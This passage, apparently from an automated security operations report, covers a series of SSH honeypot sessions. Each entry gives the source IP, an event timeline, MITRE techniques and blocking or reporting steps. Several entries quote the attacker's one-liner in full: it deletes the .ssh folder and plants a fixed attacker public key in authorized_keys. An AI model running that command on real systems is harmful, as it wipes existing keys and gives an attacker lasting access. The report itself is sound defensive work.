| `2026-06-12 13:10:39` | `cowrie.command.failed` |
| `2026-06-12 13:10:39` | `cowrie.log.closed` |
| `2026-06-12 13:10:39` | `cowrie.session.params` |
| `2026-06-12 13:10:39` | `cowrie.command.input` |
| `2026-06-12 13:10:39` | `cowrie.session.file_download` |
| `2026-06-12 13:10:39` | `cowrie.log.closed` |
| `2026-06-12 13:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e7e05a8440f

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 13:10 |
| **Last Seen** | 2026-06-12 13:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:10:40` | `cowrie.session.connect` |
| `2026-06-12 13:10:40` | `cowrie.client.version` |
| `2026-06-12 13:10:40` | `cowrie.client.kex` |
| `2026-06-12 13:10:40` | `cowrie.login.success` |
| `2026-06-12 13:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
- [ ] Block `183.82.120[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-773f212a73fa

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:11 |
| **Last Seen** | 2026-06-12 13:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:11:06` | `cowrie.session.connect` |
| `2026-06-12 13:11:06` | `cowrie.client.version` |
| `2026-06-12 13:11:06` | `cowrie.client.kex` |
| `2026-06-12 13:11:07` | `cowrie.login.success` |
| `2026-06-12 13:11:07` | `cowrie.session.params` |
| `2026-06-12 13:11:07` | `cowrie.command.input` |
| `2026-06-12 13:11:07` | `cowrie.command.failed` |
| `2026-06-12 13:11:07` | `cowrie.log.closed` |
| `2026-06-12 13:11:07` | `cowrie.session.params` |
| `2026-06-12 13:11:07` | `cowrie.command.input` |
| `2026-06-12 13:11:07` | `cowrie.session.file_download` |
| `2026-06-12 13:11:07` | `cowrie.log.closed` |
| `2026-06-12 13:11:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-418f460926d5

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:11 |
| **Last Seen** | 2026-06-12 13:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:11:09` | `cowrie.session.connect` |
| `2026-06-12 13:11:09` | `cowrie.client.version` |
| `2026-06-12 13:11:09` | `cowrie.client.kex` |
| `2026-06-12 13:11:10` | `cowrie.login.success` |
| `2026-06-12 13:11:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d126315657c

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-06-12 13:11 |
| **Last Seen** | 2026-06-12 13:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:11:09` | `cowrie.session.connect` |
| `2026-06-12 13:11:09` | `cowrie.client.version` |
| `2026-06-12 13:11:10` | `cowrie.client.kex` |
| `2026-06-12 13:11:10` | `cowrie.login.success` |
| `2026-06-12 13:11:10` | `cowrie.session.params` |
| `2026-06-12 13:11:10` | `cowrie.command.input` |
| `2026-06-12 13:11:10` | `cowrie.command.failed` |
| `2026-06-12 13:11:11` | `cowrie.log.closed` |
| `2026-06-12 13:11:11` | `cowrie.session.params` |
| `2026-06-12 13:11:11` | `cowrie.command.input` |
| `2026-06-12 13:11:11` | `cowrie.session.file_download` |
| `2026-06-12 13:11:11` | `cowrie.log.closed` |
| `2026-06-12 13:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-333dabf8531a

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-06-12 13:11 |
| **Last Seen** | 2026-06-12 13:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:11:13` | `cowrie.session.connect` |
| `2026-06-12 13:11:13` | `cowrie.client.version` |
| `2026-06-12 13:11:13` | `cowrie.client.kex` |
| `2026-06-12 13:11:14` | `cowrie.login.success` |
| `2026-06-12 13:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a09cf81323e2

| Field | Detail |
|---|---|
| **Source IP** | `103.250.149[.]148` |
| **First Seen** | 2026-06-12 13:11 |
| **Last Seen** | 2026-06-12 13:11 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:11:31` | `cowrie.session.connect` |
| `2026-06-12 13:11:33` | `cowrie.client.version` |
| `2026-06-12 13:11:33` | `cowrie.client.kex` |
| `2026-06-12 13:11:37` | `cowrie.login.success` |
| `2026-06-12 13:11:37` | `cowrie.direct-tcpip.request` |
| `2026-06-12 13:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.250.149[.]148` to AbuseIPDB if not already reported
- [ ] Block `103.250.149[.]148` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcee85ceb3fd

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:12 |
| **Last Seen** | 2026-06-12 13:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:12:46` | `cowrie.session.connect` |
| `2026-06-12 13:12:46` | `cowrie.client.version` |
| `2026-06-12 13:12:46` | `cowrie.client.kex` |
| `2026-06-12 13:12:46` | `cowrie.login.success` |
| `2026-06-12 13:12:47` | `cowrie.session.params` |
| `2026-06-12 13:12:47` | `cowrie.command.input` |
| `2026-06-12 13:12:47` | `cowrie.command.failed` |
| `2026-06-12 13:12:47` | `cowrie.log.closed` |
| `2026-06-12 13:12:47` | `cowrie.session.params` |
| `2026-06-12 13:12:47` | `cowrie.command.input` |
| `2026-06-12 13:12:47` | `cowrie.session.file_download` |
| `2026-06-12 13:12:47` | `cowrie.log.closed` |
| `2026-06-12 13:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dc6d751d828

| Field | Detail |
|---|---|
| **Source IP** | `178.255.72[.]35` |
| **First Seen** | 2026-06-12 13:12 |
| **Last Seen** | 2026-06-12 13:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:12:49` | `cowrie.session.connect` |
| `2026-06-12 13:12:49` | `cowrie.client.version` |
| `2026-06-12 13:12:49` | `cowrie.client.kex` |
| `2026-06-12 13:12:50` | `cowrie.login.success` |
| `2026-06-12 13:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.255.72[.]35` to AbuseIPDB if not already reported
- [ ] Block `178.255.72[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88619ed504c0

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-06-12 13:13 |
| **Last Seen** | 2026-06-12 13:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:13:43` | `cowrie.session.connect` |
| `2026-06-12 13:13:43` | `cowrie.client.version` |
| `2026-06-12 13:13:44` | `cowrie.client.kex` |
| `2026-06-12 13:13:44` | `cowrie.login.success` |
| `2026-06-12 13:13:44` | `cowrie.session.params` |
| `2026-06-12 13:13:44` | `cowrie.command.input` |
| `2026-06-12 13:13:44` | `cowrie.command.failed` |
| `2026-06-12 13:13:45` | `cowrie.log.closed` |
| `2026-06-12 13:13:45` | `cowrie.session.params` |
| `2026-06-12 13:13:45` | `cowrie.command.input` |
| `2026-06-12 13:13:45` | `cowrie.session.file_download` |
| `2026-06-12 13:13:45` | `cowrie.log.closed` |
| `2026-06-12 13:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-327fae283509

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-06-12 13:13 |
| **Last Seen** | 2026-06-12 13:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:13:47` | `cowrie.session.connect` |
| `2026-06-12 13:13:47` | `cowrie.client.version` |
| `2026-06-12 13:13:47` | `cowrie.client.kex` |
| `2026-06-12 13:13:48` | `cowrie.login.success` |
| `2026-06-12 13:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4babaa3739e

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:15 |
| **Last Seen** | 2026-06-12 13:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:15:17` | `cowrie.session.connect` |
| `2026-06-12 13:15:17` | `cowrie.client.version` |
| `2026-06-12 13:15:17` | `cowrie.client.kex` |
| `2026-06-12 13:15:18` | `cowrie.login.success` |
| `2026-06-12 13:15:18` | `cowrie.session.params` |
| `2026-06-12 13:15:18` | `cowrie.command.input` |
| `2026-06-12 13:15:18` | `cowrie.command.failed` |
| `2026-06-12 13:15:19` | `cowrie.log.closed` |
| `2026-06-12 13:15:19` | `cowrie.session.params` |
| `2026-06-12 13:15:19` | `cowrie.command.input` |
| `2026-06-12 13:15:19` | `cowrie.session.file_download` |
| `2026-06-12 13:15:19` | `cowrie.log.closed` |
| `2026-06-12 13:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01a57bc4e541

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:15 |
| **Last Seen** | 2026-06-12 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:15:22` | `cowrie.session.connect` |
| `2026-06-12 13:15:22` | `cowrie.client.version` |
| `2026-06-12 13:15:22` | `cowrie.client.kex` |
| `2026-06-12 13:15:23` | `cowrie.login.success` |
| `2026-06-12 13:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-905f4ee8d47c

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:19 |
| **Last Seen** | 2026-06-12 13:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:19:10` | `cowrie.session.connect` |
| `2026-06-12 13:19:10` | `cowrie.client.version` |
| `2026-06-12 13:19:11` | `cowrie.client.kex` |
| `2026-06-12 13:19:11` | `cowrie.login.success` |
| `2026-06-12 13:19:12` | `cowrie.session.params` |
| `2026-06-12 13:19:12` | `cowrie.command.input` |
| `2026-06-12 13:19:12` | `cowrie.command.failed` |
| `2026-06-12 13:19:12` | `cowrie.log.closed` |
| `2026-06-12 13:19:13` | `cowrie.session.params` |
| `2026-06-12 13:19:13` | `cowrie.command.input` |
| `2026-06-12 13:19:13` | `cowrie.session.file_download` |
| `2026-06-12 13:19:13` | `cowrie.log.closed` |
| `2026-06-12 13:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dd701404a2f

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]80` |
| **First Seen** | 2026-06-12 13:19 |
| **Last Seen** | 2026-06-12 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:19:15` | `cowrie.session.connect` |
| `2026-06-12 13:19:15` | `cowrie.client.version` |
| `2026-06-12 13:19:16` | `cowrie.client.kex` |
| `2026-06-12 13:19:16` | `cowrie.login.success` |
| `2026-06-12 13:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]80` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ee5f24b7e5

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 13:20 |
| **Last Seen** | 2026-06-12 13:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:20:42` | `cowrie.session.connect` |
| `2026-06-12 13:20:42` | `cowrie.client.version` |
| `2026-06-12 13:20:42` | `cowrie.client.kex` |
| `2026-06-12 13:20:43` | `cowrie.login.success` |
| `2026-06-12 13:20:43` | `cowrie.session.params` |
| `2026-06-12 13:20:43` | `cowrie.command.input` |
| `2026-06-12 13:20:43` | `cowrie.command.failed` |
| `2026-06-12 13:20:43` | `cowrie.log.closed` |
| `2026-06-12 13:20:44` | `cowrie.session.params` |
| `2026-06-12 13:20:44` | `cowrie.command.input` |
| `2026-06-12 13:20:44` | `cowrie.session.file_download` |
| `2026-06-12 13:20:44` | `cowrie.log.closed` |
| `2026-06-12 13:20:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d50e887f82f

| Field | Detail |
|---|---|
| **Source IP** | `185.99.99[.]95` |
| **First Seen** | 2026-06-12 13:20 |
| **Last Seen** | 2026-06-12 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:20:46` | `cowrie.session.connect` |
| `2026-06-12 13:20:46` | `cowrie.client.version` |
| `2026-06-12 13:20:47` | `cowrie.client.kex` |
| `2026-06-12 13:20:47` | `cowrie.login.success` |
| `2026-06-12 13:20:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.99.99[.]95` to AbuseIPDB if not already reported
- [ ] Block `185.99.99[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04865aa6a18f

| Field | Detail |
|---|---|
| **Source IP** | `183.82.120[.]244` |
| **First Seen** | 2026-06-12 13:24 |
| **Last Seen** | 2026-06-12 13:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 13:24:08` | `cowrie.session.connect` |
| `2026-06-12 13:24:08` | `cowrie.client.version` |
| `2026-06-12 13:24:08` | `cowrie.client.kex` |
| `2026-06-12 13:24:09` | `cowrie.login.success` |
| `2026-06-12 13:24:09` | `cowrie.session.params` |
| `2026-06-12 13:24:09` | `cowrie.command.input` |
| `2026-06-12 13:24:09` | `cowrie.command.failed` |
| `2026-06-12 13:24:09` | `cowrie.log.closed` |
| `2026-06-12 13:24:09` | `cowrie.session.params` |
| `2026-06-12 13:24:09` | `cowrie.command.input` |
| `2026-06-12 13:24:09` | `cowrie.session.file_download` |
| `2026-06-12 13:24:09` | `cowrie.log.closed` |
| `2026-06-12 13:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.120[.]244` to AbuseIPDB if not already reported
